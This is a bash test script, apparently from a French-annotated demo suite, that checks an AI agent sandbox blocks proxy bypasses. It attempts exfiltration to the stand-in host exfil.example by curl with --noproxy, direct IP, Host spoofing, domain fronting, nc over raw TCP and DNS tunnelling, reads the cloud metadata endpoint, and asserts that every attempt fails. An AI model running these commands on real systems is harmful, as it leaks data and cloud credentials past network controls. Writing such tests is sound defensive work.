#!/usr/bin/env bash
# 05 — Proxy ignoré, IP directe, TCP brut, DNS externe, métadonnées cloud (EF-22, ENF-07, cahier §8).
# shellcheck source=demo/lib.sh
. "$(dirname "$0")/../lib.sh"
scenario_begin 05-contournement-proxy-ignore "curl --noproxy, IP directe, nc, DNS externe, métadonnées"
require_demo laurent-bot
positive_control laurent-bot
m="s05-$(rand_hex)"; since="$(now_iso)"
attempt laurent-bot "curl --noproxy '*'" "curl -sS --noproxy '*' --max-time 8 -d $m https://exfil.example/n"
attempt laurent-bot "direct IP (no DNS, no SNI)" "curl -sS -k --noproxy '*' --max-time 8 -d $m https://$EXFIL_IP/ip"
attempt laurent-bot "direct IP over HTTP" "curl -sS --noproxy '*' --max-time 8 -d $m http://$EXFIL_IP/ip80"
attempt laurent-bot "Host header spoofing" "curl -sS --noproxy '*' --max-time 8 -d $m -H 'Host: allowed.example' http://$EXFIL_IP/spoof"
attempt laurent-bot "domain fronting (SNI allowed, Host forbidden)" "curl -sS --max-time 8 -d $m -H 'Host: exfil.example' https://allowed.example/front"
attempt laurent-bot "raw TCP (nc)" "echo $m | nc -w 3 $EXFIL_IP 4444"
attempt laurent-bot "external DNS resolver" "dig +time=3 +tries=1 @$DEMO_DNS_IP $m.exfil.example A"
attempt laurent-bot "public resolver" "dig +time=3 +tries=1 @8.8.8.8 $m.exfil.example A"
attempt laurent-bot "cloud metadata" "curl -sS --noproxy '*' --max-time 5 http://169.254.169.254/latest/meta-data/"
attempt laurent-bot "change the route (no NET_ADMIN)" "ip route replace default via 10.77.0.1"

upstream_received exfil "$m" && fail "something reached exfil.example"
evidence "exfil.example received nothing (HTTP, HTTPS, raw TCP)"
fronted="$(upstream_log allowed-api | grep -c -- "$m" || true)"
[ "$fronted" = 0 ] || fail "the domain-fronted request reached allowed-api"
# DNS tunnelling: a query for a forbidden name must never reach the outside resolver.
dc logs --since "$since" demo-dns 2>/dev/null | grep -q -- "$m" && fail "the DNS query for $m.exfil.example reached the outside resolver"
evidence "the outside resolver never saw $m.exfil.example"
agent_sh laurent-bot 'ip route' | grep -q "^default via $GATEWAY_IP " || fail "default route changed"
evidence "default route still via the gateway"
pass "aucune méthode de contournement n'a abouti"
